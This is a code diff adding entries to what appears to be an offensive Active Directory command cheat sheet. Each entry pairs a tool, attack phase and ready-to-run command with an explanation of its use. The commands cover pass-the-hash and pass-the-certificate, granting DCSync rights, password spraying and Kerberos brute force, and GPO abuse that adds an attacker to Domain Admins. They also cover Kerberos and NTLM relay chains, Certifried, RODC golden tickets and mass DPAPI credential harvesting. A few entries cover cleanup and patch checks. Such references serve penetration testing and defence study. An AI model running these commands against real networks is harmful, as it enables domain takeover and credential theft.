     description: "Dumps users, groups, computers, GPOs, ACLs, trusts and password policy into a single Excel/CSV report.",
     useCase: "Building a comprehensive offline inventory of the domain to review without repeatedly hitting the DC.",
+  },
+  {
+    id: "adexplorer-snapshot",
+    tool: "AD Explorer",
+    phase: "recon",
+    title: "Take a snapshot of the directory",
+    command: "AdExplorer.exe -snapshot $DOMAIN C:\\adexplorer_$DOMAIN.dat",
+    description: "SysInternals GUI tool that connects to a DC and saves the entire directory (objects, attributes, schema, security descriptors) as a single offline .dat snapshot.",
+    useCase: "Grabbing a full offline copy of AD to browse or diff later without repeated authenticated queries against the live DC.",
+  },
+  {
+    id: "adexplorer-compare",
+    tool: "AD Explorer",
+    phase: "recon",
+    title: "Diff two snapshots for changes",
+    command: "AdExplorer.exe -compare snapshot1.dat snapshot2.dat",
+    description: "Compares two saved snapshots and highlights every object/attribute added, removed, or modified between them — permissions, group membership, GPO links included.",
+    useCase: "Spotting privilege escalation or persistence changes (new group members, modified ACLs) made between two points in time, e.g. before/after an attack or over an engagement.",
   },
 
   // ============ POWERVIEW ============
@@ -1670,6 +2089,24 @@ const ENTRIES = [
     useCase: "Setting up Kerberos auth for tools that need a cached ticket rather than a password on every call.",
   },
   {
+    id: "impacket-gettgt-hashes",
+    tool: "Impacket (GetTGT.py)",
+    phase: "cred",
+    title: "Request a TGT with an NT hash (overpass-the-hash)",
+    command: "GetTGT.py -hashes :$HASH $DOMAIN/$USER@$TARGET",
+    description: "Same TGT request as GetTGT.py, but authenticates with an NT hash instead of a cleartext password — the LM half can be left empty since only the NT hash matters for the exchange.",
+    useCase: "Converting an NTLM hash into a fully usable Kerberos TGT (.ccache) without ever needing the plaintext password.",
+  },
+  {
+    id: "impacket-gettgt-aeskey",
+    tool: "Impacket (GetTGT.py)",
+    phase: "cred",
+    title: "Request a TGT with an AES key (pass-the-key)",
+    command: "GetTGT.py -aesKey $HASH $DOMAIN/$USER@$TARGET",
+    description: "Requests a TGT using an AES128/256 Kerberos key instead of a password or NT hash — useful when only the AES key was recovered (e.g. from DPAPI/DSInternals output), since NTLM-based auth won't accept it.",
+    useCase: "Authenticating in AES-only environments (NTLM restricted/disabled) where an NT hash alone wouldn't be accepted.",
+  },
+  {
     id: "impacket-getst",
     tool: "Impacket (getST.py)",
     phase: "lateral",
@@ -1695,6 +2132,69 @@ const ENTRIES = [
     command: "gettgtpkinit.py -cert-pfx $OUTFILE.pfx $DOMAIN/$TARGETOBJECT $OUTFILE.ccache",
     description: "Authenticates via PKINIT using a certificate instead of a password, and can recover the account's NT hash from the PKINIT response.",
     useCase: "The Linux-side equivalent of certipy auth — useful when the certificate came from a source other than Certipy.",
+  },
+  {
+    id: "pkinit-gettgt-pem",
+    tool: "PKINITtools (gettgtpkinit.py)",
+    phase: "cred",
+    title: "Request a TGT from a PEM cert + key pair",
+    command: "gettgtpkinit.py -cert-pem $OUTFILE.pem -key-pem $OUTFILE.key $DOMAIN/$TARGETOBJECT $OUTFILE.ccache",
+    description: "Same PKINIT TGT request as the PFX variant, but for certificates already split into separate PEM certificate and private key files instead of a single PFX bundle.",
+    useCase: "Handling certificates exported or issued in PEM form (e.g. from non-Windows CAs or OpenSSL workflows) rather than Certipy's default PFX output.",
+  },
+  {
+    id: "pkinit-getnthash",
+    tool: "PKINITtools (getnthash.py)",
+    phase: "cred",
+    title: "UnPAC-the-hash — recover NT hash from a PKINIT TGT",
+    command: "getnthash.py -key $HASH $DOMAIN/$TARGETOBJECT",
+    description: "Uses the PKINIT protocol extension that returns session-key material tied to the account's NT hash, recovering the actual NT hash straight from a certificate-based TGT request — no NTLM authentication ever takes place.",
+    useCase: "Turning a certificate (e.g. from ESC1/ESC8 or Shadow Credentials) directly into an NT hash usable everywhere else, without needing a separate DCSync.",
+  },
+  {
+    id: "pkinit-gets4uticket",
+    tool: "PKINITtools (gets4uticket.py)",
+    phase: "lateral",
+    title: "S4U2Self a service ticket from a PKINIT TGT",
+    command: "gets4uticket.py kerberos+ccache://$DOMAIN\\\\$TARGETOBJECT:$OUTFILE.ccache@$DC cifs/$TARGET $OUTFILE.ccache",
+    description: "Uses an already-obtained PKINIT TGT to request a service ticket for a specific SPN via S4U2Self, without needing the account's NT hash at all.",
+    useCase: "Getting usable access to a specific service straight from a certificate-derived TGT, skipping the UnPAC-the-hash step entirely when a hash isn't actually needed.",
+  },
+  {
+    id: "certipy-unprotect-pfx",
+    tool: "Certipy",
+    phase: "cred",
+    title: "Strip a password off a protected PFX",
+    command: "certipy cert -pfx $OUTFILE.pfx -password $PASS -export -out unprotected.pfx",
+    description: "Older Certipy versions can't consume a password-protected PFX directly for auth — this re-exports it password-free first so certipy auth can load it.",
+    useCase: "Working around older Certipy builds when a certificate came out of Certipy find/req with a set PFX password.",
+  },
+  {
+    id: "certipy-split-pfx",
+    tool: "Certipy",
+    phase: "cred",
+    title: "Split a PFX into separate cert and key files",
+    command: "certipy cert -pfx $OUTFILE.pfx -nokey -out user.crt",
+    description: "Extracts just the certificate (or, with -nocert instead, just the private key) from a PFX bundle — the format PassTheCert and several other cert-auth tools expect instead of a single PFX file.",
+    useCase: "Feeding a Certipy-obtained certificate into tooling (like PassTheCert) that wants a separate cert/key pair rather than a PFX bundle.",
+  },
+  {
+    id: "passthecert-elevate-dcsync",
+    tool: "PassTheCert",
+    phase: "privesc",
+    title: "Authenticate with a certificate and grant DCSync",
+    command: "passthecert.py -action modify_user -crt user.crt -key user.key -domain $DOMAIN -dc-ip $DC -target $TARGETOBJECT -elevate",
+    description: "Binds to LDAP using Schannel (certificate) authentication instead of NTLM/Kerberos, then directly grants the target account DCSync rights (DS-Replication-Get-Changes / -All) over the domain object.",
+    useCase: "Converting any usable client certificate straight into DCSync rights — LDAPS/Schannel auth is frequently overlooked by monitoring focused on NTLM/Kerberos.",
+  },
+  {
+    id: "nxc-pass-the-cert",
+    tool: "NetExec (nxc)",
+    phase: "cred",
+    title: "Authenticate with a certificate (Pass-the-Certificate)",
+    command: "nxc ldap $TARGET --pfx-cert $OUTFILE.pfx --pfx-pass $PASS -u $USER",
+    description: "Authenticates over LDAP/LDAPS using a PFX client certificate instead of a password or hash — nxc also accepts --pfx-base64 for an inline base64 PFX, or --pem-cert/--pem-key for a split PEM cert/key pair.",
+    useCase: "Validating a stolen or requested certificate's access directly through NetExec, without switching to Certipy or a separate PKINIT tool.",
   },
 
   // ============ ADDITIONAL CREDENTIAL ACCESS ============
@@ -1789,6 +2289,24 @@ const ENTRIES = [
     useCase: "Granting yourself GenericAll on an object once you hold WriteDacl or ownership over it.",
   },
   {
+    id: "dacledit-check-altsecid-rights",
+    tool: "Impacket (dacledit.py)",
+    phase: "recon",
+    title: "Check who can write a target's altSecurityIdentities",
+    command: "dacledit.py -action read -principal $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS",
+    description: "Reads a target object's DACL to check for the specific rights that let you plant an ESC14 explicit certificate mapping: Write-Property on altSecurityIdentities itself, Write-Property on Public-Information, Write-Property (all), WriteDacl, WriteOwner, GenericWrite/GenericAll, or ownership.",
+    useCase: "Confirming ESC14 write access to a specific target before spending time enrolling a certificate and building the mapping string.",
+  },
+  {
+    id: "getweakexplicitmappings",
+    tool: "GetWeakExplicitMappings.py",
+    phase: "recon",
+    title: "Enumerate weak explicit certificate mappings domain-wide",
+    command: "python3 GetWeakExplicitMappings.py -dc-host $DC -u $USER -p $PASS -domain $DOMAIN",
+    description: "Scans every account's altSecurityIdentities attribute domain-wide for mapping types considered weak (X509RFC822, X509IssuerSubject, X509SubjectOnly, or a non-unique Issuer-only mapping) — the accounts this turns up are ESC14-B/C/D targets, exploitable by matching their existing weak mapping rather than needing write access to plant a new one.",
+    useCase: "Finding pre-existing weak mappings across the whole domain instead of checking one target's DACL at a time.",
+  },
+  {
     id: "impacket-changepasswd",
     tool: "Impacket (changepasswd.py)",
     phase: "cred",
@@ -1814,6 +2332,24 @@ const ENTRIES = [
     command: "Invoke-DomainPasswordSpray -Password 'Summer2026!' -OutFile sprayed.txt",
     description: "Pulls the domain user list automatically and sprays one password against all of them, respecting the account lockout policy.",
     useCase: "Windows-native alternative to nxc spraying when operating from a domain-joined PowerShell session.",
+  },
+  {
+    id: "smartbrute-brute",
+    tool: "smartbrute",
+    phase: "cred",
+    title: "Bruteforce Kerberos pre-auth (brute mode)",
+    command: "smartbrute.py brute -bU users.txt -bP passwords.txt kerberos -d $DOMAIN",
+    description: "Standard bruteforce mode — tries every user/password combination from the supplied lists against Kerberos pre-authentication, reading AS-REQ error codes to tell valid creds from invalid ones without a full authentication attempt.",
+    useCase: "Straightforward username+password list bruteforce when you have no existing credentials to seed smarter enumeration.",
+  },
+  {
+    id: "smartbrute-smart",
+    tool: "smartbrute",
+    phase: "cred",
+    title: "Lockout-aware password spray (smart mode)",
+    command: "smartbrute.py smart -bP passwords.txt ntlm -d $DOMAIN -u $USER -p $PASS kerberos",
+    description: "Smart mode uses one already-valid low-priv credential to enumerate the real user list and password/lockout policy over LDAP first, then sprays only against accounts that won't trip a lockout — instead of blindly bruteforcing.",
+    useCase: "Safer, quieter password spraying once you already hold one valid credential to enumerate with.",
   },
   {
     id: "get-lapsadpassword",
@@ -1854,6 +2390,15 @@ const ENTRIES = [
     useCase: "Coercion fallback when EFSRPC and the print spooler are both patched or disabled.",
   },
   {
+    id: "gpoddity-coerce-relay",
+    tool: "GPOddity",
+    phase: "privesc",
+    title: "Coerce and relay via GPO SYSVOL script abuse",
+    command: "gpoddity.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC --relay-to ldap://$DC",
+    description: "Plants a coercion primitive inside a GPO-linked SYSVOL script/shortcut so any machine that later applies that GPO authenticates back to the attacker — a GPO-based coercion source instead of relying on a specific coercible RPC service (PetitPotam/PrinterBug/DFSCoerce) being reachable.",
+    useCase: "Coercing authentication from every machine that processes a given GPO — useful when the usual RPC-based coercion primitives are all patched, firewalled, or otherwise unreachable.",
+  },
+  {
     id: "mitm6",
     tool: "mitm6",
     phase: "cred",
@@ -1892,6 +2437,33 @@ const ENTRIES = [
     command: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author $DOMAIN\\$USER --Command cmd.exe --Arguments '/c net localgroup administrators $USER /add' --GPOName 'VulnGPO'",
     description: "Adds a malicious scheduled task to a GPO you control, executed on every computer the GPO applies to at the next policy refresh.",
     useCase: "Turning GPO write access into local admin on every machine in that GPO's scope.",
+  },
+  {
+    id: "pygpoabuse-immediate-task",
+    tool: "pyGPOabuse",
+    phase: "privesc",
+    title: "Add an immediate scheduled task to an existing GPO (Linux)",
+    command: "pygpoabuse '$DOMAIN/$USER:$PASS' -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\"",
+    description: "Linux/Python equivalent of SharpGPOAbuse's immediate-task technique — updates an existing GPO you control to add a scheduled task that runs at the next policy refresh and removes itself afterward.",
+    useCase: "Same GPO-write-to-code-execution primitive as SharpGPOAbuse, from a Linux attack host with no .NET binary needed.",
+  },
+  {
+    id: "gpowned-immediate-task",
+    tool: "GPOwned",
+    phase: "privesc",
+    title: "Create a new immediate scheduled task via a GPO (Linux)",
+    command: "GPOwned -u $USER -p $PASS -d $DOMAIN -dc-ip $DC -gpoimmtask -name \"12345677-ABCD-9876-ABCD-123456789012\" -author $DOMAIN\\\\Administrator -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\\windows\\system32\\calc.exe'",
+    description: "Creates a brand-new GPO-linked immediate scheduled task from Linux rather than modifying an existing one — the author notes this tool is buggy and not meant for production use, so pyGPOabuse is the steadier choice when one is already available.",
+    useCase: "A fallback GPO-abuse option when pyGPOabuse isn't staged, with the caveat that it's explicitly flagged upstream as unreliable.",
+  },
+  {
+    id: "invoke-gpowned-multitasking",
+    tool: "Invoke-GPOwned",
+    phase: "privesc",
+    title: "Multitasking attack — escalate to Domain Admin via a GPO'd session",
+    command: "Invoke-GPOwned -GPOName \"Target_GPO_Name\" -LoadDLL '.\\Microsoft.ActiveDirectory.Management.dll' -User Attacker -DA -ScheduledTasksXMLPath '.\\ScheduledTasks.xml' -SecondTaskXMLPath '.\\wsadd.xml' -Author DA_User -SecondXMLCMD \"/r net group 'Domain Admins' Attacker /add /domain\"",
+    description: "A two-stage scheduled-task chain for when a Domain Admin session already exists on a non-DC workstation/server that applies a GPO you control: the first task runs as SYSTEM and drops a batch file onto SYSVOL, which registers a second task set to run with the highest available privileges — landing in the actual Domain Admin's logon context and adding the attacker straight into Domain Admins.",
+    useCase: "Escalating from ordinary GPO write access to full Domain Admin group membership, specifically by riding an existing privileged session on a machine rather than needing that machine's own local admin rights.",
   },
   {
     id: "gpp-decrypt",
@@ -2174,6 +2746,24 @@ const ENTRIES = [
     useCase: "The actual payoff step right after a successful Zerologon exploit.",
   },
   {
+    id: "zerologon-relay-dcsync",
+    tool: "Impacket (ntlmrelayx.py)",
+    phase: "cred",
+    title: "Non-disruptive Zerologon: relay straight to a DCSync",
+    command: "ntlmrelayx.py -t dcsync://$TARGETOBJECT -smb2support",
+    description: "Dirk-jan Mollema's alternative to the classic password-change exploit — instead of touching the DC's own machine password at all, it relays a coerced authentication straight into operating a DCSync, so there's nothing to restore afterward and zero impact on domain replication.",
+    useCase: "Getting the same full-domain DCSync payoff as Zerologon without any of the disruption risk of the password-reset technique.",
+  },
+  {
+    id: "coercer-zerologon-relay",
+    tool: "Coercer",
+    phase: "cred",
+    title: "Coerce a DC's authentication into the Zerologon relay",
+    command: "coercer coerce -t $DC -l $ATTACKER -u $USER -p $PASS -d $DOMAIN",
+    description: "Triggers any RPC coercion primitive (MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP) against the target DC so it authenticates to the attacker, feeding the waiting ntlmrelayx dcsync:// relay from the entry above.",
+    useCase: "The coercion half of the non-disruptive Zerologon relay chain — works against any DC, or any other account with sufficient privileges to be worth relaying.",
+  },
+  {
     id: "zerologon-restore",
     tool: "Zerologon (CVE-2020-1472)",
     phase: "evasion",
@@ -2397,6 +2987,24 @@ const ENTRIES = [
     command: "certipy req -u 'FAKE01$'@$DOMAIN -p 'Passw0rd!' -ca 'CA-NAME' -template Machine -dns $DC",
     description: "Requests a certificate using the default Machine template — since the computer's dNSHostName now matches the real DC, the issued certificate authenticates as that DC.",
     useCase: "Complete domain compromise from a standard, unprivileged domain user account (patched by Microsoft in May 2022 — check patch status first).",
+  },
+  {
+    id: "certifried-detect-patch",
+    tool: "Certipy",
+    phase: "recon",
+    title: "Check whether a target is patched against Certifried",
+    command: "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'User'",
+    description: "If the resulting certificate embeds a SID (Certipy prints \"Certificate object SID is [...]\"), the CA is patched — the szOID_NTDS_CA_SECURITY_EXT extension only appears post-patch. No SID printed means the attack can proceed; note both the CA and the KDC need patching for full protection.",
+    useCase: "A quick, low-noise patch-level check before spending effort setting up the full attack chain.",
+  },
+  {
+    id: "bloodyad-certifried-manual",
+    tool: "bloodyAD",
+    phase: "privesc",
+    title: "Certifried: clear SPNs and rewrite dNSHostName manually",
+    command: "bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set object $TARGETOBJECT serviceprincipalname\nbloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set object $TARGETOBJECT dnsHostName -v '$DC.$DOMAIN'",
+    description: "The raw two-step mechanism certipy's `account update -dns` performs automatically: clearing the computer's existing SPNs first (so the constraint-violation check has nothing to compare against), then overwriting dNSHostName to the target DC's hostname — otherwise the DC rejects the rename outright.",
+    useCase: "Understanding or replicating the exact Certifried mechanism from bloodyAD when Certipy's higher-level `account update` isn't available or desired.",
   },
 
   // --- ShadowCoerce ---
@@ -2836,8 +3444,8 @@ const ENTRIES = [
     tool: "Certipy",
     phase: "evasion",
     title: "Restore a certificate template's original configuration",
-    command: "certipy template -u $USER@$DOMAIN -p $PASS -template 'VulnTemplate' -configuration VulnTemplate.json",
-    description: "Restores a certificate template to the configuration saved by an earlier `certipy template -save-old` call, undoing the ESC1-style reconfiguration used to demonstrate ESC4.",
+    command: "certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC -template 'VulnTemplate' -write-configuration 'VulnTemplate.json' -no-save",
+    description: "Restores a certificate template to the configuration automatically saved by the earlier `certipy template -write-default-configuration` call, undoing the ESC1-style reconfiguration used to demonstrate ESC4 (Certipy v5 flag names — older versions used -save-old/-configuration).",
     useCase: "Never leave a certificate template in its exploited state after an ESC4 demonstration — this is a standing, silent privilege-escalation path for anyone else who finds it.",
   },
   {
@@ -2898,6 +3506,90 @@ const ENTRIES = [
     description: "Removes the wildcard A record planted for a relay setup, restoring normal DNS resolution behavior for the zone.",
     useCase: "A wildcard DNS record left in place after testing silently breaks normal name resolution for any client requesting a hostname that doesn't exist — always clean this up.",
   },
+
+  // ============ KERBEROS RELAY ============
+  {
+    id: "krbrelayx-adcs-dns-poison",
+    tool: "krbrelayx",
+    phase: "lateral",
+    title: "Relay a Kerberos AP-REQ to ADCS web enrollment (via mitm6/DNS)",
+    command: "krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER --victim $TARGETOBJECT --adcs --template Machine",
+    description: "Waits for an incoming Kerberos authentication (obtained via a mitm6 DNS-poisoning SOA/TKEY exchange) and relays the AP-REQ to AD CS's HTTP web enrollment endpoint, requesting a Machine certificate on the victim's behalf — HTTP doesn't enforce Kerberos signing the way LDAP does, which is what makes this relay viable at all.",
+    useCase: "Kerberos-only environments (NTLM disabled, or the client is in Protected Users) where an NTLM relay to ESC8 wouldn't work, but a DNS-poisoned Kerberos relay still does.",
+  },
+  {
+    id: "mitm6-krbrelay-dns-poison",
+    tool: "mitm6",
+    phase: "lateral",
+    title: "Poison DNS to feed a Kerberos relay (pair with krbrelayx)",
+    command: "mitm6 -i $ATTACKER -d $DOMAIN -hw $TARGET --relay $ADCS_FQDN -v",
+    description: "Advertises itself as the network's IPv6 DNS server so the victim's dynamic-DNS-update SOA/TKEY exchange gets intercepted, forcing it to Kerberos-authenticate to the attacker instead of the real DC — the resulting AP-REQ is what krbrelayx (running in a second terminal) then relays onward.",
+    useCase: "Setting up the DNS-poisoning half of a Kerberos relay chain to ADCS/SCCM when NTLM is unavailable or restricted.",
+  },
+  {
+    id: "krbrelayx-smb-dump",
+    tool: "krbrelayx",
+    phase: "cred",
+    title: "Relay a Kerberos AP-REQ to unsigned SMB",
+    command: "krbrelayx.py -t smb://$TARGET",
+    description: "Relays a captured Kerberos AP-REQ straight to an unsigned SMB service — if the relayed identity holds local admin there, SAM/LSA secrets can be dumped immediately, the same payoff as an unsigned-SMB NTLM relay.",
+    useCase: "Cashing in a Kerberos relay against SMB when the target of the relay (not the coerced victim) doesn't enforce SMB signing.",
+  },
+  {
+    id: "dnstool-spn-spoof-record",
+    tool: "dnstool.py (krbrelayx)",
+    phase: "lateral",
+    title: "Register a DNS record that spoofs a coerced SPN's target",
+    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS -r \"[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" -d $ATTACKER --action add $DC --tcp",
+    description: "Registers an ADIDNS record whose name is the target NetBIOS name plus a Base64-encoded minimal CREDENTIAL_TARGET_INFORMATION structure — a coerced client building an SPN like cifs/target will resolve and connect to this record instead, while still Kerberos-authenticating with an AP-REQ for the original SPN's identity.",
+    useCase: "Setting up the DNS half of a coerced Kerberos relay (e.g. toward an ADCS/PKI host) — any authenticated user can normally create this ADIDNS record by default.",
+  },
+  {
+    id: "coercer-to-spoofed-record",
+    tool: "Coercer",
+    phase: "lateral",
+    title: "Coerce authentication toward a spoofed DNS record",
+    command: "coercer coerce -t $TARGET -l \"[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" -u $USER -p $PASS -d $DOMAIN",
+    description: "Forces the target to authenticate toward the spoofed DNS record just registered instead of the real relay target's name, producing a Kerberos AP-REQ that krbrelayx (listening on the attacker host) can then relay onward — e.g. to the ADCS HTTP enrollment endpoint.",
+    useCase: "Turning any standard coercion primitive into a Kerberos (rather than NTLM) relay, useful specifically when NTLM is restricted but the coerced service still accepts Kerberos.",
+  },
+  {
+    id: "responder-spoof-answer-name",
+    tool: "Responder",
+    phase: "lateral",
+    title: "Spoof the LLMNR answer name to redirect a Kerberos SPN request",
+    command: "sudo responder -I $INTERFACE -N $TARGETOBJECT",
+    description: "Answers LLMNR/mDNS/NBT-NS resolution failures with a response whose name differs from the query — pointing an HTTP client's failed lookup at the attacker's IP while making it request a service ticket for an arbitrary relay target's SPN instead of its own hostname, since Kerberos SPN construction trusts the DNS response name over the original query.",
+    useCase: "Relaying pre-authenticated Kerberos HTTP auth (e.g. to ADCS web enrollment) purely from a poisoned name-resolution failure, no coercion vulnerability required.",
+  },
+  {
+    id: "unicode-krbrelay-dns-record",
+    tool: "dnstool.py (krbrelayx)",
+    phase: "lateral",
+    title: "CVE-2025-58726/2026-26128 — register a Unicode-lookalike DNS record",
+    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS $DC --action add -r \"[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]\" -d $ATTACKER",
+    description: "Registers a hostname built from Unicode lookalike characters (e.g. Ⓡ U+24C7 in place of R) that LDAP's SPN matching normalizes as identical to the real target, while Windows' loopback-detection logic (CompareStringW, case-insensitive only) does not — the mismatch this CVE pair patched in March 2026.",
+    useCase: "Setting up the Kerberos reflective-relay bypass on an unpatched host — note the modified krbrelayx build needed to actually relay the resulting AP-REQ was not publicly released at time of writing; this reflects the documented attack flow, not a turnkey public exploit.",
+  },
+  {
+    id: "unicode-krbrelay-coerce",
+    tool: "PetitPotam",
+    phase: "lateral",
+    title: "CVE-2025-58726/2026-26128 — coerce auth toward the Unicode FQDN",
+    command: "petitpotam.py -u $USER -p $PASS -d $DOMAIN \"[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]\" $TARGET",
+    description: "Coerces the target machine into authenticating toward the registered Unicode-lookalike hostname instead of its own real name, producing the Kerberos AP-REQ that a modified krbrelayx would relay back to the originating machine — a reflective relay, same class of impact as the earlier NTLM loopback bypasses.",
+    useCase: "Same caveat as the DNS-registration step: this is the documented attack flow from Synacktiv's research, not something fully executable with public tooling as of this writing.",
+  },
+  {
+    id: "unicode-krbrelay-cleanup",
+    tool: "dnstool.py (krbrelayx)",
+    phase: "evasion",
+    title: "Remove a Unicode-lookalike relay DNS record",
+    command: "dnstool.py -u $DOMAIN\\$USER -p $PASS $DC --action remove -r \"[TARGET_NETBIOS_UNICODE].[DOMAIN_UNICODE]\" --tcp",
+    description: "Cleans up the Unicode-lookalike DNS record after testing, the same way any other planted relay/ADIDNS record should be removed once finished.",
+    useCase: "Leaving a homoglyph DNS record in place is both an unnecessary persistence artifact and a dead giveaway on review — always remove it.",
+  },
+
   {
     id: "rodc-secretsdump",
     tool: "Impacket (secretsdump.py)",
@@ -2906,6 +3598,87 @@ const ENTRIES = [
     command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
     description: "Run against a Read-Only Domain Controller specifically, this only returns credentials for accounts in that RODC's Allowed RODC Password Replication Group — a much smaller set than a full DC would return, by design.",
     useCase: "Checking exactly which accounts an RODC has cached — useful both offensively (targeting a branch-office RODC) and defensively (auditing that a compromised RODC's blast radius was actually limited as intended).",
+  },
+  {
+    id: "rodc-own-krbtgt-dump",
+    tool: "Impacket (secretsdump.py)",
+    phase: "cred",
+    title: "Dump an RODC's own krbtgt account hash",
+    command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
+    description: "Every RODC gets its own dedicated krbtgt account (krbtgt_<number>), separate from the domain-wide krbtgt — fill $TARGETOBJECT with that account's name. Once you hold local admin/DSRM on the RODC itself, this pulls a fully usable ticket-forging hash.",
+    useCase: "Turning local compromise of a single branch-office RODC into a ticket-forging key, without ever touching the domain's real krbtgt account.",
+  },
+  {
+    id: "rodc-golden-ticket",
+    tool: "Mimikatz",
+    phase: "persist",
+    title: "Forge a golden ticket scoped to a compromised RODC",
+    command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /ptt",
+    description: "Identical golden-ticket forging as a normal krbtgt compromise, but signed with an RODC's own krbtgt hash instead of the domain's real one — writable DCs only trust their own krbtgt key, so this ticket is honored solely by that RODC, not the wider domain.",
+    useCase: "Quiet, narrowly-scoped persistence on a compromised RODC that survives a domain-wide krbtgt rotation, since the RODC's own krbtgt key rotates independently of the domain's.",
+  },
+  {
+    id: "powerviewpy-connect",
+    tool: "PowerView.py (aniqfakhrul)",
+    phase: "privesc",
+    title: "Connect to an interactive LDAP shell (Linux)",
+    command: "powerview \"$DOMAIN\"/\"$USER\":\"$PASS\"@\"$TARGET\"",
+    description: "A from-scratch Python reimplementation of classic PowerShell PowerView, exposing the same Get-/Set-/Add-DomainObject-style cmdlet syntax inside an interactive shell — not to be confused with the PowerSploit PowerView module already covered elsewhere.",
+    useCase: "Running familiar PowerView-style LDAP object edits from a Linux attack host, without needing a Windows box or the PowerShell module staged.",
+  },
+  {
+    id: "powerviewpy-rodc-reveal-set",
+    tool: "PowerView.py (aniqfakhrul)",
+    phase: "privesc",
+    title: "Add a target account to an RODC's msDS-RevealOnDemandGroup",
+    command: "Set-DomainObject -Identity 'RODC-server$' -Set @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=domain,DC=local'}",
+    description: "Run inside the PowerView.py shell once connected — overwrites the RODC's msDS-RevealOnDemandGroup to include the target account, making it eligible to have its credentials cached and replicated to that RODC.",
+    useCase: "The first step of turning ACL control over an RODC's computer object into a path toward that target account's actual credentials.",
+  },
+  {
+    id: "powerviewpy-rodc-reveal-append",
+    tool: "PowerView.py (aniqfakhrul)",
+    phase: "privesc",
+    title: "Append the Allowed RODC Password Replication Group",
+    command: "Set-DomainObject -Identity 'RODC-server$' -Append @{'msDS-RevealOnDemandGroup'='CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local'}",
+    description: "Adds the built-in Allowed RODC Password Replication Group back into msDS-RevealOnDemandGroup alongside the newly added target — keeping the RODC's normal caching behavior intact instead of replacing it outright.",
+    useCase: "Avoiding collateral changes to which ordinary accounts the RODC already caches, while still adding the new target.",
+  },
+  {
+    id: "powerviewpy-rodc-neverreveal-clear",
+    tool: "PowerView.py (aniqfakhrul)",
+    phase: "privesc",
+    title: "Clear msDS-NeverRevealGroup if it blocks the target",
+    command: "Set-DomainObject -Identity 'RODC-server$' -Clear msDS-NeverRevealGroup",
+    description: "msDS-NeverRevealGroup takes priority over msDS-RevealOnDemandGroup — if the target account (or a group it belongs to) is listed there, it must be cleared or the reveal-group addition above has no effect.",
+    useCase: "Removing the explicit deny-list that would otherwise silently block the whole technique.",
+  },
+  {
+    id: "bloodyad-rodc-reveal-read",
+    tool: "bloodyAD",
+    phase: "recon",
+    title: "Read an RODC's current msDS-RevealOnDemandGroup value",
+    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $TARGETOBJECT --attr msDS-RevealOnDemandGroup",
+    description: "Reads the RODC computer object's current msDS-RevealOnDemandGroup membership before modifying it, so the existing value (usually just the Allowed RODC Password Replication Group) can be preserved alongside the new addition.",
+    useCase: "Checking what's already there before overwriting it, since bloodyAD's set requires listing every value you want to keep.",
+  },
+  {
+    id: "bloodyad-rodc-reveal-set",
+    tool: "bloodyAD",
+    phase: "privesc",
+    title: "Add a target account to an RODC's msDS-RevealOnDemandGroup",
+    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'",
+    description: "The Linux/bloodyAD equivalent of the PowerView.py -Set/-Append pair — writes both the original value and the new target account in one call, since bloodyAD's set replaces the full attribute rather than appending.",
+    useCase: "Making a Domain Admin account eligible for credential caching on an RODC you have ACL control over, without needing PowerView.py staged.",
+  },
+  {
+    id: "bloodyad-rodc-neverreveal-clear",
+    tool: "bloodyAD",
+    phase: "privesc",
+    title: "Clear an RODC's msDS-NeverRevealGroup",
+    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-NeverRevealGroup",
+    description: "Clears the deny-list attribute (by setting it with no values) if the target account or one of its groups was explicitly excluded there — msDS-NeverRevealGroup otherwise overrides msDS-RevealOnDemandGroup entirely.",
+    useCase: "Removing the one thing that would silently block the reveal-group addition from taking effect.",
   },
 
   // ============ POWERVIEW / NATIVE AD MODULE ============
@@ -3129,6 +3902,15 @@ const ENTRIES = [
     command: "SharpDPAPI.exe credentials /pvk:$OUTFILE.pem",
     description: "Given the domain's DPAPI backup key (see the Mimikatz lsadump::backupkeys entry above), decrypts any domain user's DPAPI-protected blobs offline — the backup key exists specifically so a lost master password doesn't lock out DPAPI data, which also makes it a domain-wide skeleton key for DPAPI.",
     useCase: "Domain Admin-equivalent reach into every domain user's saved credentials/cookies/certificates, from a single backup key extraction.",
+  },
+  {
+    id: "donpapi-mass-collect",
+    tool: "DonPAPI",
+    phase: "cred",
+    title: "Mass-harvest DPAPI secrets across many hosts",
+    command: "DonPAPI.py collect -d $DOMAIN -u $USER -p $PASS -t $TARGET",
+    description: "Remotely triages and decrypts DPAPI secrets (Wi-Fi keys, RDP/Credential Manager entries, Chrome/Edge saved passwords, certificates) across every reachable host in one pass — the SharpDPAPI workflow applied at domain scale instead of one host at a time.",
